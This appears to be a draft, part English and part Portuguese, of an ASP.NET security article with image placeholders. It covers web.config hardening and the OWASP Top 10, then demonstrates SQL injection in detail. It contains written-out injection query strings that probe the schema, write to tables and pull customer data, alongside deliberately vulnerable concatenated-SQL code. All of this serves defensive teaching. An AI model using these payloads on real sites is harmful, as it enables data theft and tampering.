+When the <trace> element is enabled for remote users of Web-based applications (localOnly="false"), any user can get detailed list of recent requests to the application simply by browsing to the page "trace.axd." A trace log presents a wealth of information: the .NET and ASP.NET versions that the server is running; a complete trace of all the page methods that the request caused, including their times of execution; the session state and application state keys; the request and response cookies; the complete set of request headers, form variables, and QueryString variables; and finally the complete set of server variables.
+
+A hacker looking for a way around application security would obviously find the form variable histories useful because these might include email addresses that could be harvested and sold to spammers, IDs and passwords that could be used to impersonate the user, or credit card and bank account numbers. Even the most innocent-looking piece of data in the trace collection can be dangerous in the wrong hands. For example, the "APPL_PHYSICAL_PATH" server variable, which contains the physical path of Web-based applications on the server, could help an attacker perform directory traversal attacks against the system.
+
+The best way to prevent a hacker from obtaining trace data from Web-based applications is to disable the trace viewer completely by setting the "enabled" attribute of the <trace> element to "false." If you have to have the trace viewer enabled, either to debug or to profile your application, then be sure to set the "localOnly" attribute of the <trace> element to "true." That allows users to access the trace viewer only from the Web server and disables viewing it from any remote machine, increasing your application security.
+
+3. Debugging Enabled
+
+You should never deploy an ASP.Net application in debug mode. Visual Studio 2005/2010 will even automatically modify the Web.config file to allow debugging when you start to debug your application. And, since deploying ASP.NET applications is as simple as copying the files from the development folder into the deployment folder, it's easy to see how development configuration settings can accidentally make it into production, compromising application security.
+
+Wrong configuration:
+
+<configuration>
+
+<system.web>
+
+<compilation debug="true">
+
+Right configuration:
+
+<configuration>
+
+<system.web>
+
+<compilation debug="false">
+
+Leaving debugging enabled is dangerous because you are providing inside information to end users who shouldn't have access to it, and who may use it to attack your Web-based applications. For example, if you have enabled debugging and disabled custom errors in your application, then any error message displayed to an end user of your Web-based applications will include not only the server information, a detailed exception message, and a stack trace, but also the actual source code of the page where the error occurred.
+
+Unfortunately, this configuration setting isn't the only way that source code might be displayed to the user. Here's a story that illustrates why developers shouldn't concentrate solely on one type of configuration setting to improve application security. In early versions of Microsoft's ASP.NET AJAX framework, some controls would return a stack trace with source code to the client browser whenever exceptions occurred. This behavior happened whenever debugging was enabled, regardless of the custom error setting in the configuration. So, even if you properly configured your Web-based applications to display non-descriptive messages when errors occurred, you could still have unexpectedly revealed your source code to your end users if you forgot to disable debugging.
+
+If you want to disable debugging, set the value of the "debug" attribute of the <compilation> element to "false." 
+
+4. Cookies Accessible through Client-Side Script
+
+In Internet Explorer 6.0, Microsoft introduced a new cookie property called "HttpOnly". While you can set the property programmatically on a per-cookie basis, you also can set it globally in the site configuration.
+
+Wrong configuration:
+
+<configuration>
+
+<system.web>
+
+<httpCookies httpOnlyCookies="false">
+
+Right configuration:
+
+<configuration>
+
+<system.web>
+
+<httpCookies httpOnlyCookies="true">
+
+Any cookie marked with this property will be accessible only from server-side code, and not to any client-side scripting code like JavaScript or VBScript. This shielding of cookies from the client helps to protect Web-based applications from Cross-Site Scripting attacks. A hacker initiates a Cross-Site Scripting (also called CSS or XSS) attack by attempting to insert his own script code into the Web page to get around any application security in place. Any page that accepts input from a user and echoes that input back is potentially vulnerable. For example, a login page that prompts for a user name and password and then displays "Welcome back, <username>" on a successful login may be susceptible to an XSS attack.
+
+As mentioned earlier, it is possible to enable "HttpOnly" programmatically on any individual cookie by setting the "HttpOnly" property of the "HttpCookie" object to "true." However, it is easier and more reliable to configure the application to automatically enable "HttpOnly" for all cookies. To do this, set the "httpOnlyCookies" attribute of the <httpCookies> element to "true."
+
+5. Cookieless Session State Enabled
+
+In the initial 1.0 release of ASP.NET, you had no choice about how to transmit the session token between requests when your Web application needed to maintain session state: it was always stored in a cookie. Unfortunately, this meant that users who would not accept cookies could not use your application. So, in ASP.NET 1.1, Microsoft added support for cookieless session tokens via use of the "cookieless" setting.
+
+Right configuration:
+
+<configuration>
+
+<system.web>
+
+<sessionState cookieless="UseUri">
+
+Secure configuration:
+
+<configuration>
+
+<system.web>
+
+<sessionState cookieless="UseCookies">
+
+Web applications configured to use cookieless session state now stored the session token in the page URLs rather than a cookie. For example, the page URL might change from
+
+http://myserver/MyApplication/default.aspx to http://myserver/MyApplication/(123456789ABCDEFG)/default.aspx. In this case, "123456789ABCDEFG" represents the current user's session token. A different user browsing the site at the same time would receive a completely different session token, resulting in a different URL, such as http://myserver/MyApplication/(ZYXWVU987654321)/default.aspx.
+
+While adding support for cookieless session state did improve the usability of ASP.NET Web applications for users who would not accept cookies, it also had the side effect of making those applications much more vulnerable to session hijacking attacks. Session hijacking is basically a form of identity theft wherein a hacker impersonates a legitimate user by stealing his session token. When the session token is transmitted in a cookie, and the request is made on a secure channel (that is, it uses SSL), the token is secure. However, when the session token is included as part of the URL, it is much easier for a hacker to find and steal it. By using a network monitoring tool (also known as a "sniffer") or by obtaining a recent request log, hijacking the user's session becomes a simple matter of browsing to the URL containing the stolen unique session token. The Web application has no way of knowing that this new request with session token "123456789ABCDEFG" is not coming from the original, legitimate user. It happily loads the corresponding session state and returns the response back to the hacker, who has now effectively impersonated the user.
+
+The most effective way to prevent these session hijacking attacks is to force your Web application to use cookies to store the session token. This is accomplished by setting the "cookieless" attribute of the <sessionState> element to "UseCookies" or "false." But what about the users who do not accept cookies? Do you have to choose between making your application available to all users versus ensuring that it operates securely for all users? A compromise between the two is possible in ASP.NET 2.0. By setting the "cookieless" attribute to "AutoDetect", the application will store the session token in a cookie for users who accept them and in the URL for those who won't. 
+
+Já vimos como podemos melhorar drasticamente a segurança de uma aplicação ASP.NET manipulando apenas o arquivo de configuração, agora, vamos dar um passeio nos modos de ataques mais comuns a aplicações ASP.NET, todos estes ataques listados abaixo, são uma cortesia da OWASP - Open Web Application Security Project ou Projeto Aberto para Segurança de Aplicações Web. A OWASP é uma organização sem fins lucrativos que tem o propósito de promover estudos e soluções para a segurança em aplicações Web. Esta criou uma litearua intitulada Os 10 riscos mais críticos em aplicações web, que são chamados de "Os 10", para saber mais sobre este documento, basta ir na seção links. A OWASP libera todos os anos o seu top 10, e também difunde sua metodologia de taxa de riscos que dispõe de uma escala, como podemos ver na Figura xxx:
+
+[Mostrar a OWASP Risk Rating Methodology]
+
+De acordo com a própria OWASP, esta metodologia foi criada porque "você" leitor,somente "você" sabe os detalhes de seu ambiente e por isso é a pessoa mais indicada para fazer tal avaliação o que simplifica e muito com a tabela apresentada acima, logo, vamos expôr um pouco estes 10 tópicos falando um pouco sobre, não muito profundamente, posto que existe muito material disponível na seção links para estudo sobre o assunto, mas daremos uma visão ampla e que possa permitir ao leitor buscar maior informações e poder já implementar algumas destas idéias em seus projetos para dispôr de alguma segurança útil e principalmente mais tempo livre para se preocupar com o que realmene importa: programar. Diante do que foi explicado nesta seção, vamos verificar os 10 maiores flagelos que afligem nossos leitores assim como nos afligiu um dia, uns ainda afligem e outros não mais nos preocupam. Vamos imaginar que alguns destes problemas são como doenças como Catapora e Sarampo que já estão praticamente erradicadas e outras são como a Malária: sabemos que existe, mas ainda tratamos seus sintomas sem ter uma cura definitiva. Deixando bem claro ao nosso leitor que o objetivo do artigo é informar sobre problemas de segurança que podem lhe causa certo e grandes transtornos, já que foi visto no gráfico presente na imagem xxx a quantidade, expressiva, de empresas, desenvolvedores e sistemas pouco preocupados com a segurança e não os culpamos, posto que as políticas bem como as pessoas estão a mercê da cobrança por alta produtividade em pouco tempo e isto é um grande problema a ser resolvido nesta próxima década do século XXI. 
+
+A1 – Injection 
+Injection flaws, such as SQL, OS, and LDAP injection, occur when untrusted data is sent to an 
+interpreter as part of a command or query. The attacker’s hostile data can trick the interpreter 
+into executing unintended commands or accessing unauthorised data. 
+
+A2 – Broken Authentication and Session Management 
+Application functions related to authentication and session management are often not 
+implemented correctly, allowing attackers to compromise passwords, keys, session tokens, or 
+exploit other implementation flaws to assume other users’ identities. 
+
+A3 – Cross-Site Scripting (XSS) 
+XSS flaws occur whenever an application takes untrusted data and sends it to a web browser 
+without proper validation and escaping. XSS allows attackers to execute scripts in the victim’s 
+browser which can hijack user sessions, deface web sites, or redirect the user to malicious sites. 
+
+A4 – Insecure Direct Object References 
+A direct object reference occurs when a developer exposes a reference to an internal 
+implementation object, such as a file, directory, or database key. Without an access control 
+check or other protection, attackers can manipulate these references to access unauthorised 
+data. 
+
+A5 – Security Misconfiguration 
+Good security requires having a secure configuration defined and deployed for the application, 
+frameworks, application server, web server, database server, and platform. All these settings 
+should be defined, implemented, and maintained as many are not shipped with secure defaults. 
+This includes keeping all software up to date, including all code libraries used by the application. 
+
+A6 – Exposição de dados sensíveis
+Many web applications do not properly protect sensitive data, such as credit cards, SSNs, and 
+authentication credentials, with appropriate encryption or hashing. Attackers may steal or 
+modify such weakly protected data to conduct identity theft, credit card fraud, or other crimes. 
+
+A7 - Falta de função para controle do nível de acesso
+Many web applications check URL access rights before rendering protected links and buttons. 
+However, applications need to perform similar access control checks each time these pages are 
+accessed, or attackers will be able to forge URLs to access these hidden pages anyway. 
+
+A8 – Cross-Site Request Forgery (CSRF) 
+A CSRF attack forces a logged-on victim’s browser to send a forged HTTP request, including 
+the victim’s session cookie and any other automatically included authentication information, to 
+a vulnerable web application. This allows the attacker to force the victim’s browser to generate 
+requests the vulnerable application thinks are legitimate requests from the victim. 
+
+A9 - Utilização de componentes vulneráveis conhecidos
+Componentes, tais como bibliotecas, frameworks, e outros módulos de software quase sempre são 
+executados com privilégios elevados. Se um componente vulnerável é explorado, um ataque pode causar 
+sérias perdas de dados ou o comprometimento do servidor. As aplicações que utilizam componentes com 
+vulnerabilidades conhecidas podem minar as suas defesas e permitir uma gama de possíveis ataques e 
+impactos.
+
+A10 – Unvalidated Redirects and Forwards 
+Web applications frequently redirect and forward users to other pages and websites, and use 
+untrusted data to determine the destination pages. Without proper validation, attackers can 
+redirect victims to phishing or malware sites, or use forwards to access unauthorised pages. 
+
+Before I start getting into the Top 10 it’s worth making a few fundamentals clear. Firstly, don’t 
+stop securing applications at just these 10 risks. There are potentially limitless exploit techniques 
+out there and whilst I’m going to be talking a lot about the most common ones, this is not an 
+exhaustive list. Indeed the OWASP Top 10 itself continues to evolve; the risks I’m going to be 
+looking at are from the 2010 revision which differs in a few areas from the 2007 release. 
+Secondly, applications are often compromised by applying a series of these techniques so don’t 
+get too focussed on any single vulnerability. Consider the potential to leverage an exploit by 
+linking vulnerabilities. Also think about the social engineering aspects of software 
+vulnerabilities, namely that software security doesn’t start and end at purely technical 
+boundaries. 
+Thirdly, the practices I’m going to write about by no means immunise code from malicious 
+activity. There are always new and innovative means of increasing sophistication being devised 
+to circumvent defences. The Top 10 should be viewed as a means of minimising risk rather 
+than eliminating it entirely. 
+Finally, start thinking very, very laterally and approach this series of posts with an open mind. 
+Experienced software developers are often blissfully unaware of how many of today’s 
+vulnerabilities are exploited and I’m the first to put my hand up and say I’ve been one of these and continue to learn new facts about application security on a daily basis. This really is a 
+serious discipline within the software industry and should not be approached casually. 
+ 
+Agora, veremos mais profundamente cada um destes problemas que podemos enfrenta e se depender de nosso artigo, evitá-los:
+
+-- Injection
+
+Let’s get started. I’m going to draw directly from the OWASP definition of injection: 
+
+"Injection flaws, such as SQL, OS, and LDAP injection, occur when untrusted data is sent to an 
+interpreter as part of a command or query. The attacker’s hostile data can trick the interpreter 
+into executing unintended commands or accessing unauthorized data. "
+
+The crux of the injection risk centres on the term “untrusted”. We’re going to see this word a 
+lot over coming posts so let’s clearly define it now: 
+
+"Untrusted data comes from any source – either direct or indirect – where integrity is not 
+verifiable and intent may be malicious. This includes manual user input such as form data, 
+implicit user input such as request headers and constructed user input such as query string 
+variables. Consider the application to be a black box and any data entering it to be untrusted. "
+
+OWASP also includes a matrix describing the source, the exploit and the impact to business
+
+[Colocar aqui como imagem xxx a matriz da OWASP para Injeção]
+
+Most of you are probably familiar with the concept (or at least the term) of SQL injection but 
+the injection risk is broader than just SQL and indeed broader than relational databases. As the 
+weakness above explains, injection flaws can be present in technologies like LDAP or 
+theoretically in any platform which that constructs queries from untrusted data. 
+
+Anatomy of a SQL injection attack 
+Let’s jump straight into how the injection flaw surfaces itself in code. We’ll look specifically at 
+SQL injection because it means working in an environment familiar to most .NET developers 
+and it’s also a very prevalent technology for the exploit. In the SQL context, the exploit needs 
+to trick SQL Server into executing an unintended query constructed with untrusted data. 
+
+For the sake of simplicity and illustration, let’s assume we’re going to construct a SQL 
+statement in C# using a parameter passed in a query string and bind the output to a grid view. 
+In this case it’s the good old Northwind database driving a product page filtered by the 
+beverages category which happens to be category ID 1. The web application has a link directly 
+to the page where the CategoryID parameter is passed through in a query string. Here’s a 
+snapshot of what the Products and Customers (we’ll get to this one) tables look like:
+
+Here’s what the code is doing, mostrado na listagem xxx: 
+
+var catID = Request.QueryString["CategoryID"]; 
+var sqlString = "SELECT * FROM Products WHERE CategoryID = " + catID; 
+var connString = WebConfigurationManager.ConnectionStrings 
+["NorthwindConnectionString"].ConnectionString; 
+using (var conn = new SqlConnection(connString)) 
+{ 
+  var command = new SqlCommand(sqlString, conn); 
+  command.Connection.Open(); 
+  grdProducts.DataSource = command.ExecuteReader(); 
+  grdProducts.DataBind(); 
+}
+
+And na figura XXXX what we’d normally expect to see in the browser:
+
+[Colocar a imagem chamada Figura_xxxx_01-SQLInjection]
+
+In this scenario, the CategoryID query string is untrusted data. We assume it is properly formed 
+and we assume it represents a valid category and we consequently assume the requested URL and 
+the sqlString variable end up looking exactly like this (I’m going to highlight the untrusted data 
+in red and show it both in the context of the requested URL and subsequent SQL statement): 
+
+Products.aspx?CategoryID=1 
+SELECT * FROM Products WHERE CategoryID = 1 
+
+Of course much has been said about assumption. The problem with the construction of this 
+code is that by manipulating the query string value we can arbitrarily manipulate the command 
+executed against the database. For example: 
+
+Products.aspx?CategoryID=1 or 1=1 
+SELECT * FROM Products WHERE CategoryID = 1 or 1=1 
+
+Obviously 1=1 always evaluates to true so the filter by category is entirely invalidated. Rather 
+than displaying only beverages we’re now displaying products from all categories. This is 
+interesting, but not particularly invasive so let’s push on a bit: 
+
+Products.aspx?CategoryID=1 ou nome=''
+
+SELECT * FROM Products WHERE CategoryID = 1 or name='' 
+
+When this statement runs against the Northwind database it’s going to fail as the Products table 
+has no column called name. In some form or another, the web application is going to return an 
+error to the user. It will hopefully be a friendly error message contextualised within the layout of 
+the website but at worst it may be a yellow screen of death. For the purpose of where we’re 
+going with injection, it doesn’t really matter as just by virtue of receiving some form of error 
+message we’ve quite likely disclosed information about the internal structure of the application, 
+namely that there is no column called name in the table(s) the query is being executed against. 
+Let’s try something different: 
+
+Products.aspx?CategoryID=1 or productname='' 
+SELECT * FROM Products WHERE CategoryID = 1 or productname='' 
+
+This time the statement will execute successfully because the syntax is valid against Northwind 
+so we have therefore confirmed the existence of the ProductName column. Obviously it’s easy 
+to put this example together with prior knowledge of the underlying data schema but in most 
+cases data models are not particularly difficult to guess if you understand a little bit about the 
+application they’re driving. Let’s continue: 
+
+Products.aspx?CategoryID=1 or 1=(select count(*) from products) 
+SELECT * FROM Products WHERE CategoryID = 1 or 1=(select count(*) from 
+products) 
+
+With the successful execution of this statement we have just verified the existence of the 
+Products tables. This is a pretty critical step as it demonstrates the ability to validate the 
+existence of individual tables in the database regardless of whether they are used by the query 
+driving the page or not. This disclosure is starting to become serious information leakage we 
+could potentially leverage to our advantage. 
+
+So far we’ve established that SQL statements are being arbitrarily executed based on the query 
+string value and that there is a table called Product with a column called ProductName. Using 
+the techniques above we could easily ascertain the existence of the Customers table and the 
+CompanyName column by fairly assuming that an online system facilitating ordering may 
+contain these objects. Let’s step it up a notch: 
+
+Products.aspx?CategoryID=1;update products set productname = productname 
+SELECT * FROM Products WHERE CategoryID = 1;update products set productname = 
+productname 
+
+The first thing to note about the injection above is that we’re now executing multiple 
+statements. The semicolon is terminating the first statement and allowing us to execute any 
+statement we like afterwards. The second really important observation is that if this page 
+successfully loads and returns a list of beverages, we have just confirmed the ability to write to 
+the database. It’s about here that the penny usually drops in terms of understanding the 
+potential ramifications of injection vulnerabilities and why OWASP categorises the technical 
+impact as “severe”. 
+All the examples so far have been non-destructive. No data has been manipulated and the 
+intrusion has quite likely not been detected. We’ve also not disclosed any actual data from the 
+application, we’ve only established the schema. Let’s change that. 
+
+Products.aspx?CategoryID=1;insert into products(productname) select 
+companyname from customers 
+
+SELECT * FROM Products WHERE CategoryID = 1;insert into products 
+(productname) select companyname from customers 
+
+So as with the previous example, we’re terminating the CategoryID parameter then injecting a 
+new statement but this time we’re populating data out of the Customers table. We’ve already 
+established the existence of the tables and columns we’re dealing with and that we can write to 
+the Products table so this statement executes beautifully. We can now load the results back into 
+the browser: 
+
+Products.aspx?CategoryID=500 or categoryid is null 
+SELECT * FROM Products WHERE CategoryID = 500 or categoryid is null 
+
+The unfeasibly high CategoryID ensures existing records are excluded and we are making the 
+assumption that the ID of new records defaults to null (obviously no default value on the column in this case). Here’s what the browser now discloses – note the company name of the customer now being disclosed in the ProductName column: 
+
+[Inserir aqui a imagem Figuraxxx_02-SQLInjectionImagem.PNG]
+
+What made this possible? 
+
+The above example could only happen because of a series of failures in the application design. 
+Firstly, the CategoryID query string parameter allowed any value to be assigned and executed by 
+SQL Server without any parsing whatsoever. Although we would normally expect an integer, 
+arbitrary strings were accepted. 
+Secondly, the SQL statement was constructed as a concatenated string and executed without 
+any concept of using parameters. The CategoryID was consequently allowed to perform 
+activities well outside the scope of its intended function. 
+Finally, the SQL Server account used to execute the statement had very broad rights. At the 
+very least this one account appeared to have data reader and data writer rights. Further probing 
+may have even allowed the dropping of tables or running of system commands if the account 
+had the appropriate rights. 
+
+Validate all input against a whitelist 
+This is a critical concept not only this post but in the subsequent OWASP posts that will follow so I’m going to say it really, really loud: 
+"All input must be validated against a whitelist of acceptable value ranges."
+
+As per the definition I gave for untrusted data, the assumption must always be made that any 
+data entering the system is malicious in nature until proven otherwise. The data might come 
+from query strings like we just saw, from form variables, request headers or even file attributes 
+such as the Exif metadata tags in JPG images. 
+In order to validate the integrity of the input we need to ensure it matches the pattern we 
+expect. Blacklists looking for patterns such as we injected earlier on are hard work both because 
+the list of potentially malicious input is huge and because it changes as new exploit techniques 
+are discovered. 
+Validating all input against whitelists is both far more secure and much easier to implement. In 
+the case above, we only expected a positive integer and anything outside that pattern should 
+have been immediate cause for concern. Fortunately this is a simple pattern that can be easily 
+validated against a regular expression. Let’s rewrite that first piece of code from earlier on with 
+the help of whitelist validation: 
+var catID = Request.QueryString["CategoryID"]; 
+var positiveIntRegex = new Regex(@"^0*[1-9][0-9]*$"); 
+if(!positiveIntRegex.IsMatch(catID)) 
+{ 
+  lblResults.Text = "An invalid CategoryID has been specified."; 
+  return; 
+} 
+Just this one piece of simple validation has a major impact on the security of the code. It 
+immediately renders all the examples further up completely worthless in that none of the 
+malicious CategoryID values match the regex and the program will exit before any SQL 
+execution occurs.
+
+An integer is a pretty simple example but the same principal applies to other data types. A 
+registration form, for example, might expect a “first name” form field to be provided. The 
+whitelist rule for this field might specify that it can only contain the letters a-z and common 
+punctuation characters (be careful with this – there are numerous characters outside this range 
+that commonly appear in names), plus it must be within 30 characters of length. The more 
+constraints that can be placed around the whitelist without resulting in false positives, the 
+better. 
+Regular expression validators in ASP.NET are a great way to implement field level whitelists as 
+they can easily provide both client side (which is never sufficient on its own) and server side 
+validation plus they tie neatly into the validation summary control. MSDN has a good overview 
+of how to use regular expressions to constrain input in ASP.NET so all you need to do now is 
+actually understand how to write a regex.
+
+Parameterised stored procedures 
+One of the problems we had above was that the query was simply a concatenated string 
+generated dynamically at runtime. The account used to connect to SQL Server then needed 
+broad permissions to perform whatever action was instructed by the SQL statement. 
+Let’s take a look at the stored procedure approach in terms of how it protects against SQL 
+injection. Firstly, we’ll put together the SQL to create the procedure and grant execute rights to 
+the user.
+
+CREATE PROCEDURE GetProducts 
+  @CategoryID INT 
+AS 
+SELECT * 
+FROM dbo.Products 
+WHERE CategoryID = @CategoryID 
+GO 
+GRANT EXECUTE ON GetProducts TO NorthwindUser 
+GO
+
+There are a couple of native defences in this approach. Firstly, the parameter must be of integer 
+type or a conversion error will be raised when the value is passed. Secondly, the context of what 
+this procedure – and by extension the invoking page – can do is strictly defined and secured 
+directly to the named user. The broad reader and writer privileges which were earlier granted in 
+order to execute the dynamic SQL are no longer needed in this context.
+
+Moving on the .NET side of things: 
+
+var conn = new SqlConnection(connString); 
+using (var command = new SqlCommand("GetProducts", conn)) 
+{ 
+  command.CommandType = CommandType.StoredProcedure; 
+  command.Parameters.Add("@CategoryID", SqlDbType.Int).Value = catID; 
+  command.Connection.Open(); 
+  grdProducts.DataSource = command.ExecuteReader(); 
+  grdProducts.DataBind(); 
+} 
+
+This is a good time to point out that parameterised stored procedures are an additional defence 
+to parsing untrusted data against a whitelist. As we previously saw with the INT data type 
+declared on the stored procedure input parameter, the command parameter declares the data 
+type and if the catID string wasn’t an integer the implicit conversion would throw a 
+System.FormatException before even touching the data layer. But of course that won’t do you 
+any good if the type is already a string! 
+Just one final point on stored procedures; passing a string parameter and then dynamically 
+constructing and executing SQL within the procedure puts you right back at the original 
+dynamic SQL vulnerability. Don’t do this! 
+
+Named SQL parameters 
+One of problems with the code in the original exploit is that the SQL string is constructed in its 
+entirety in the .NET layer and the SQL end has no concept of what the parameters are. As far 
+as it’s concerned it has just received a perfectly valid command even though it may in fact have 
+already been injected with malicious code. 
+Using named SQL parameters gives us far greater predictability about the structure of the query 
+and allowable values of parameters. What you’ll see in the following code block is something 
+very similar to the first dynamic SQL example except this time the SQL statement is a constant 
+with the category ID declared as a parameter and added programmatically to the command 
+object. 
+const string sqlString = "SELECT * FROM Products WHERE CategoryID = 
+@CategoryID"; 
+var connString = WebConfigurationManager.ConnectionStrings 
+["NorthwindConnectionString"].ConnectionString; 
+using (var conn = new SqlConnection(connString)) 
+{ 
+  var command = new SqlCommand(sqlString, conn); 
+  command.Parameters.Add("@CategoryID", SqlDbType.Int).Value = catID; 
+  command.Connection.Open(); 
+  grdProducts.DataSource = command.ExecuteReader(); 
+  grdProducts.DataBind(); 
+} 
+What this will give us is a piece of SQL that looks like this: 
+exec sp_executesql N'SELECT * FROM Products WHERE CategoryID = 
+@CategoryID',N'@CategoryID int',@CategoryID=1 
+There are two key things to observe in this statement: 
+1.  The sp_executesql command is invoked 
+2.  The CategoryID appears as a named parameter of INT data type 
+This statement is only going to execute if the account has data reader permissions to the 
+Products table so one downside of this approach is that we’re effectively back in the same data 
+layer security model as we were in the very first example. We’ll come to securing this further 
+shortly. 
+
+The last thing worth noting with this approach is that the sp_executesql command also 
+provides some query plan optimisations which although are not related to the security 
+discussion, is a nice bonus.
+
+LINQ to SQL 
+Stored procedures and parameterised queries are a great way of seriously curtailing the potential 
+damage that can be done by SQL injection but they can also become pretty unwieldy. The case 
+for using ORM as an alternative has been made many times before so I won’t rehash it here but 
+I will look at this approach in the context of SQL injection. It’s also worthwhile noting that 
+LINQ to SQL is only one of many ORMs out there and the principals discussed here are not 
+limited purely to one of Microsoft’s interpretation of object mapping. 
+Firstly, let’s assume we’ve created a Northwind DBML and the data layer has been persisted 
+into queryable classes. Things are now pretty simple syntax wise: 
+var dc = new NorthwindDataContext(); 
+var catIDInt = Convert.ToInt16(catID); 
+grdProducts.DataSource = dc.Products.Where(p => p.CategoryID == catIDInt); 
+grdProducts.DataBind(); 
+From a SQL injection perspective, once again the query string should have already been 
+assessed against a whitelist and we shouldn’t be at this stage if it hasn’t passed. Before we can 
+use the value in the “where” clause it needs to be converted to an integer because the DBML 
+has persisted the INT type in the data layer and that’s what we’re going to be performing our 
+equivalency test on. If the value wasn’t an integer we’d get that System.FormatException again 
+and the data layer would never be touched. 
+LINQ to SQL now follows the same parameterised SQL route we saw earlier, it just abstracts 
+the query so the developer is saved from being directly exposed to any SQL code. The database 
+is still expected to execute what from its perspective, is an arbitrary statement: 
+
+exec sp_executesql N'SELECT ProductID, ProductName, 
+SupplierID, CategoryID, QuantityPerUnit, 
+UnitPrice, UnitsInStock, UnitsOnOrder, 
+ReorderLevel, Discontinued 
+FROM dbo.Products  
+WHERE CategoryID = @p0',N'@p0 int',@p0=1
+
+There was some discussion about the security model in the early days of LINQ to SQL and 
+concern expressed in terms of how it aligned to the prevailing school of thought regarding 
+secure database design. Much of the reluctance related to the need to provide accounts 
+connecting to SQL with reader and writer access at the table level. Concerns included the risk 
+of SQL injection as well as from the DBA’s perspective, authority over the context a user was 
+able to operate in moved from their control – namely within stored procedures – to the 
+application developer’s control. However with parameterised SQL being generated and the 
+application developers now being responsible for controlling user context and access rights it 
+was more a case of moving cheese than any new security vulnerabilities. 
+Applying the principle of least privilege 
+The final flaw in the successful exploit above was that the SQL account being used to browse 
+products also had the necessary rights to read from the Customers table and write to the 
+Products table, neither of which was required for the purposes of displaying products on a 
+page. In short, the principle of least privilege had been ignored: 
+
+"In information security, computer science, and other fields, the principle of least privilege, also 
+known as the principle of minimal privilege or just least privilege, requires that in a particular 
+abstraction layer of a computing environment, every module (such as a process, a user or a 
+program on the basis of the layer we are considering) must be able to access only such 
+information and resources that are necessary to its legitimate purpose. "
+
+This was achievable because we took the easy way out and used a single account across the 
+entire application to both read and write from the database. Often you’ll see this happen with 
+the one SQL account being granted db_datareader and db_datawriter roles: 
+
+[Colocar a imagem Figuraxxx_03-SQLInjectionImagem.PNG]
+ 
+This is a good case for being a little more selective about the accounts we’re using and the rights 
+they have. Quite frequently, a single SQL account is used by the application. The problem this 
+introduces is that the one account must have access to perform all the functions of the 
+application which most likely includes reading and writing data from and to tables you simply 
+don’t want everyone accessing. 
+
+Let’s go back to the first example but this time we’ll create a new user with only select 
+permissions to the Products table. We’ll call this user NorthwindPublicUser and it will be used 
+by activities intended for the general public, i.e. not administrative activates such as managing 
+customers or maintaining products. 
+
+[Colocar a imagem [Colocar a imagem Figuraxxx_04-SQLInjectionImagem.PNG]]
+
+Now let’s go back to the earlier request attempting to validate the existence of the Customers 
+table: 
+Products.aspx?CategoryID=1 or 1=(select count(*) from customers)
+
+[Colocar a imagem [Colocar a imagem Figuraxxx_05-SQLInjectionImagem.PNG]]
+
+In this case I’ve left custom errors off and allowed the internal error message to surface through 
+the UI for the purposes of illustration. Of course doing this in a production environment is 
+never a good thing not only because it’s information leakage but because the original objective 
+of verifying the existence of the table has still been achieved. Once custom errors are on there’ll 
+be no external error message hence there will be no verification the table exists. Finally – and 
+most importantly - once we get to actually trying to read or write unauthorised data the exploit 
+will not be successful. 
+This approach does come with a cost though. Firstly, you want to be pragmatic in the definition 
+of how many logons are created. Ending up with 20 different accounts for performing different 
+functions is going to drive the DBA nuts and be unwieldy to manage. Secondly, consider the 
+impact on connection pooling. Different logons mean different connection strings which mean 
+different connection pools. 
+On balance, a pragmatic selection of user accounts to align to different levels of access is a good 
+approach to the principle of least privilege and shuts the door on the sort of exploit 
+demonstrated above.
+
+Getting more creative with HTTP request headers 
+
+On a couple of occasions above I’ve mentioned parsing input other than just the obvious stuff 
+like query strings and form fields. You need to consider absolutely anything which could be 
+submitted to the server from an untrusted source. 
+A good example of the sort of implicit untrusted data submission you need to consider is the 
+accept-language attribute in the HTTP request headers. This is used to specify the spoken 
+language preference of the user and is passed along with every request the browser makes. 
+Here’s how the headers look after inspecting them with Fiddler:
+
+[Colocar a imagem [Colocar a imagem Figuraxxx_06-SQLInjectionImagem.PNG]]
+
+Note the preference Browser has delivered in this case is “en-gb”. The developer can now access 
+this attribute in code: 
+
+var language = HttpContext.Current.Request.UserLanguages[0]; 
+lblLanguage.Text = "The browser language is: " + language; 
+
+The language is often used to localise content on the page for applications with multilingual 
+capabilities. The variable we’ve assigned above may be passed to SQL Server – possibly in a 
+concatenated SQL string - should language variations be stored in the data layer.
+
+But what if a malicious request header was passed? What if, for example, we used the Fiddler 
+Request Builder to reissue the request but manipulated the header ever so slightly first: 
+
+[Colocar a imagem [Colocar a imagem Figuraxxx_06-SQLInjectionImagem.PNG]]
+
+We’ve looked enough at where an exploit can go from here already, the main purpose of this 
+section was to illustrate how injection can take different attack vectors in its path to successful 
+execution. In reality, .NET has far more efficient ways of doing language localisation but this 
+just goes to prove that vulnerabilities can be exposed through more obscure channels. 
+
+Summary 
+The potential damage from injection exploits is indeed, severe. Data disclosure, data loss, 
+database object destruction and potentially limitless damage to reputation. 
+The thing is though, injection is a really easy vulnerability to apply some pretty thorough 
+defences against. Fortunately it’s uncommon to see dynamic, parameterless SQL strings 
+constructed in .NET code these days. ORMs like LINQ to SQL are very attractive from a 
+productivity perspective and the security advantages that come with it are eradicating some of 
+those bad old practices. 
+Input parsing, however, remains a bit more elusive. Often developers are relying on type 
+conversion failures to detect rogue values which, of course, won’t do much good if the 
+expected type is already a string and contains an injection payload. We’re going to come back to 
+input parsing again in the next part of the series on XSS. For now, let’s just say that not parsing 
+input has potential ramifications well beyond just injection vulnerabilities.
+
+I suspect securing individual database objects to different accounts is not happening very 
+frequently at all. The thing is though, it’s the only defence you have at the actual data layer if 
+you’ve moved away from stored procedures. Applying the least privilege principle here means 
+that in conjunction with the other measures, you’ve now erected injection defences on the 
+input, the SQL statement construction and finally at the point of its execution. Ticking all these 
+boxes is a very good place to be indeed.
+
+-- Cross-Site Scripting (XSS)
+In the first post of this series I talked about injection and of most relevance for .NET 
+developers, SQL injection. This exploit has some pretty severe consequences but fortunately
+many of the common practices employed when building .NET apps today – namely accessin
+data via stored procedures and ORMs – mean most apps have a head start on fending off 
+attackers. 
+Cross-site scripting is where things begin to get really interesting, starting with the fact that it
+by far and away the most commonly exploited vulnerability out there today. Last year, 
+WhiteHat Security delivered their Website Security Statistics Report and found a staggering 
+65% of websites with XSS vulnerabilities, that’s four times as many as the SQL injection 
+vulnerability we just looked at. 
+
+Defining XSS 
+Let’s go back to the OWASP definition: 
+XSS flaws occur whenever an application takes untrusted data and sends it to a web browser 
+without proper validation and escaping. XSS allows attackers to execute scripts in the victim’s 
+browser which can hijack user sessions, deface web sites, or redirect the user to malicious sites. 
